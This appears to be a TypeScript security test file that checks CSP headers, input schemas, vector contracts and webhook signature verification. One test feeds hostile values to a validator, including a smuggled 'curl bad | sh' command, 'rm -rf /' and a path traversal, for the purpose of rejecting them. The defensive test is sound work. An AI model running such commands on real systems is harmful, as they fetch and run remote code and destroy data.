import { test } from "node:test";
import assert from "node:assert/strict";
import { createHmac } from "node:crypto";
import {
  operation,
  recordInput,
  envelope,
} from "../packages/contracts/index.ts";
import { verifyWebhook, hash, equal } from "../packages/auth/index.ts";
import { server } from "../packages/observability/index.ts";

test("HTTP assets are allowed only locally; remote environments retain HTTPS upgrades", async (t) => {
  const original = process.env.FV_ENV;
  t.after(() => {
    if (original === undefined) delete process.env.FV_ENV;
    else process.env.FV_ENV = original;
  });
  for (const environment of ["local", "staging", "production"]) {
    process.env.FV_ENV = environment;
    const app = await server("security-test");
    try {
      const response = await app.inject({ url: "/health/live" });
      assert.equal(response.statusCode, 200);
      const csp = String(response.headers["content-security-policy"]);
      assert.equal(
        csp.includes("upgrade-insecure-requests"),
        environment !== "local",
      );
      assert(csp.includes("script-src 'self'"));
    } finally {
      await app.close();
    }
  }
});

test("privileged operation schemas reject command injection and unknown parameters", () => {
  assert.equal(
    operation.safeParse({
      action: "deploy.release",
      parameters: { release: "x; curl bad | sh" },
    }).success,
    false,
  );
  assert.equal(
    operation.safeParse({
      action: "backup.verify",
      parameters: { command: "rm -rf /" },
    }).success,
    false,
  );
  assert.equal(
    operation.safeParse({ action: "shell", parameters: {} }).success,
    false,
  );
  assert.equal(
    operation.safeParse({
      action: "wireguard.revoke",
      parameters: { name: "../other" },
    }).success,
    false,
  );
});
test("vector contracts reject nonfinite, mismatched and zero vectors", () => {
  for (const embedding of [
    [0, 0, 0],
    [NaN, 1, 2],
    [1, 2],
    [Infinity, 2, 3],
  ])
    assert.equal(
      recordInput.safeParse({ content: "x", embedding }).success,
      false,
    );
  assert.equal(
    recordInput.safeParse({ content: "test", embedding: [1, 0, 0] }).success,
    true,
  );
});
test("queue envelope requires durable provenance and excludes injected properties", () => {
  assert.equal(
    envelope.safeParse({ version: 1, jobId: "nope" }).success,
    false,
  );
});
test("webhook signatures bind timestamp/body and reject replay window", () => {
  const now = Date.now(),
    stamp = String(Math.floor(now / 1000)),
    body = Buffer.from('{"id":"synthetic"}'),
    key = "synthetic-key";
  const sig = createHmac("sha256", key)
    .update(`${stamp}.`)
    .update(body)
    .digest("hex");
  assert(verifyWebhook(body, stamp, sig, key, now));
  assert(!verifyWebhook(Buffer.from("changed"), stamp, sig, key, now));
  assert(!verifyWebhook(body, stamp, sig, key, now + 301000));
  assert(!equal(hash("a"), hash("b")));
});
